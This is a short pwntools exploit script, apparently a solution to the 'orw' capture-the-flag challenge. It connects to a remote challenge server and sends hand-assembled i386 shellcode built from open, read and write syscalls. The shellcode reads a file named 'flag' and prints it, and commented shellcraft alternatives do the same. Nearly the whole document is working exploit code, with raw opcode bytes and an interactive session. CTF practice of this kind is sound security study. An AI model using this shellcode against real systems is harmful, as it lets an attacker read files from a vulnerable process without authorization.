#(void*)(input)直接执行
from pwn import *

# io = remote('chall.pwnable.tw', 10001)
io = remote('node4.buuoj.cn', 29879)
# io = remote("192.168.170.128", 9999)
context(arch = 'i386', os = 'linux')
# elf = ELF('orw-srop')

#fd = open('/home/orw-srop/flag',0)
# s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''
s = b"\x31\xd2\xb9\x00\x00\x00\x00\xbb\x94\xa0\x04\x08\xb8\x05\x00\x00\x00\xcd\x80"

#read(fd,0x804a094,0x20)
# s += ''' mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''
s += b"\xba\x40\x00\x00\x00\x89\xd9\x89\xc3\xb8\x03\x00\x00\x00\xcd\x80"

#write(1,0x804a094,0x20)
# s += ''' mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; '''
s += b"\xba\x40\x00\x00\x00\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"

payload = s + b'flag\x00'
io.sendline(payload)
# print(io.recv())

io.interactive()
# payload = shellcraft.open("/home/orw/flag")
# payload += shellcraft.read("eax", "esp", 0x80)
# payload += shellcraft.write(1, "esp", 0x80)